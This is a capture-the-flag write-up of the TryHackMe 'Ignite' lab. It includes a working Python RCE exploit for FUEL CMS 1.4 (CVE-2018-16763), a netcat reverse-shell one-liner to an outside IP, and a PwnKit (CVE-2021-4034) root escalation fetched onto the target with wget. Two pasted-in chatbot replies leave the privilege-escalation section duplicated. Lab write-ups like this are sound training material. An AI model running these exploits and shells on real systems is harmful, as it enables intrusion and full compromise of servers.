---
title: 'TryHackMe - Ignite'
author: r2cook
categories: [TryHackMe]
tags: [ Fule CMS, RCE, PrivEsc, pkexec, PwnKit]
render_with_liquid: false
media_subpath: /images/thm/Ignite/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **Ignite** machine by chaining **targeted service enumeration, web application analysis, remote code execution, and Linux privilege escalation**, moving from an exposed CMS foothold to full root compromise while capturing both user and root flags.

## Initial Setup

Add the target to your hosts file:

```plaintext
10.130.145.179 ignite.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn -T4 --max-retries 3 --min-rate 1000 -oN full_nmap_scan.txt ignite.thm
```
{: .nolineno }

**Command Breakdown:**

- `-p-` → scan all ports (1–65535)
    
- `-sV` → detect service versions
    
- `-sC` → run default NSE scripts
    
- `-Pn` → skip host discovery
    
- `--min-rate 1000` → faster scan (≥1000 packets/sec)
    
- `-oN` → save output to file
    

**Nmap Results:**

```txt
/tmp/tmp.PQbwaCsU7j » nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt ignite.thm  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-01 02:10 EET  
Nmap scan report for ignite.thm (10.130.145.179)  
Host is up (0.072s latency).  
Not shown: 65534 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
80/tcp open  http   Apache httpd 2.4.18 ((Ubuntu))  
|_http-title: Welcome to FUEL CMS  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
| http-robots.txt: 1 disallowed entry   
|_/fuel/  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 29.46 seconds
```

**Key Findings:**

- HTTP (80) → FUEL CMS
    
- FTP (21)
    
- SSH (22)
    

---

## Web Portal Enumeration

![](web_portal_80_enum.webp){: width="800" height="400" .shadow }

From the main page, we see `Fuel CMS` version `1.4`.

Scrolling down:

![](web_portal_80_2.webp){: width="800" height="400" .shadow }

```
To access the FUEL admin, go to:  

[http://ignite.thm/fuel](http://ignite.thm/fuel)  

User name: **admin**  
Password: **admin** (you can and should change this password and admin user information after logging in)
```

![](fuel_admin_login.webp){: width="800" height="400" .shadow }

![](fuel_admin_dashboard.webp){: width="800" height="400" .shadow }

---

### RCE Exploitation

After researching `Fuel CMS 1.4` exploits, we can use **CVE-2018-16763** for remote command execution.  
Reference: [Medium Article](https://medium.com/@MonlesYen/deep-dive-fuel-cms-1-4-1-rce-exploitation-cve-2018-16763-8083c9b090ae)

Python exploit script:

```python
import requests  
import urllib.parse  
import argparse  
  
def find_nth_overlapping(haystack, needle, n):  
    start = haystack.find(needle)  
    while start >= 0 and n > 1:  
        start = haystack.find(needle, start + 1)  
        n -= 1  
    return start  
  
def main():  
    parser = argparse.ArgumentParser(  
        description="FUEL CMS 1.4.1 RCE Exploit (CVE-2018-16763)"  
    )  
    parser.add_argument(  
        "-u", "--url",  
        required=True,  
        help="Target URL (e.g. http://ignite.thm)"  
    )  
    parser.add_argument(  
        "--proxy",  
        action="store_true",  
        help="Use Burp proxy at 127.0.0.1:8080"  
    )  
  
    args = parser.parse_args()  
    url = args.url.rstrip("/")  
  
    proxies = {"http": "http://127.0.0.1:8080"} if args.proxy else None  
  
    print("[+] Target:", url)  
    print("[+] Starting interactive shell...\n")  
  
    while True:  
        try:  
            cmd = input("cmd> ")  
  
            payload = (  
                url  
                + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28"  
                + urllib.parse.quote(cmd)  
                + "%27%29%2b%27"  
            )  
  
            r = requests.get(payload, proxies=proxies)  
  
            begin = r.text[0:20]  
            dup = find_nth_overlapping(r.text, begin, 2)  
  
            print(r.text[0:dup])  
  
        except KeyboardInterrupt:  
            print("\n[!] Exiting...")  
            break  
  
if __name__ == "__main__":  
    main()
```

---

### Reverse Shell Command

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.145.29 9001 >/tmp/f
```
{: .nolineno }

Open listener:

```shell
nc -lnvp 9001
```
{: .nolineno }

Run Python script:

```shell
python3 fule1_4_rce.py -u http://ignite.thm
```
{: .nolineno }

![](exec_python_script.webp){: width="800" height="400" .shadow }

![](reverceshell_cmd_exec.webp){: width="800" height="400" .shadow }

We gain a reverse shell as `www-data`.

User flag location:

```shell
/home/www-data
```
{: .nolineno }

![](user_flag.webp){: width="800" height="400" .shadow }

---

Got you — your PrivEsc section was a bit “too fast”. I’ll expand it properly with **CVE, explanation, GitHub, and clear steps (local + target)** while keeping your style clean.

---

## Privilege Escalation (PwnKit)

### Enumeration

We start by checking sudo:

```shell
sudo -l
```
{: .nolineno }

→ Requires password ❌

So we move to SUID binaries:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

Output includes:

```shell
/usr/bin/pkexec
```
{: .nolineno }

---

Got it — that’s actually the **better & more realistic approach** (especially when `gcc` is not available on target). Here’s your corrected PrivEsc section using **compile locally → transfer → execute**.

---

## Privilege Escalation (PrivEsc)

### Enumeration

```shell
sudo -l
```
{: .nolineno }

→ Requires password ❌

Check SUID binaries:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

Output:

```shell
/usr/bin/pkexec
```
{: .nolineno }

---

## Vulnerability: PwnKit

- **Binary:** `pkexec`
    
- **CVE:** **CVE-2021-4034**
    
- **Name:** PwnKit
    
- **Impact:** Local Privilege Escalation (root)
    

### Description

A vulnerability in `polkit` allows abuse of `pkexec` to execute code as **root** due to improper handling of environment variables.

---

## Exploit Source

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

---

## Exploitation (Compile Locally → Run on Target)

### Step 1 — On Your Local Machine (Compile)

```shell
git clone https://github.com/ly4k/PwnKit.git
cd PwnKit
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```
{: .nolineno }

---

### Step 2 — Transfer Exploit to Target

Start a server locally:

```shell
python3 -m http.server 8000
```
{: .nolineno }

On the target:

```shell
cd /tmp
wget http://<YOUR_IP>:8000/PwnKit
chmod +x PwnKit
```
{: .nolineno }

---

### Step 3 — Run Exploit on Target

```shell
./PwnKit
```
{: .nolineno }

If successful:

```shell
# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

---

## Get Root Flag

```shell
cat /root/root.txt
```
{: .nolineno }

![](local_privesc.webp){: width="800" height="400" .shadow }

---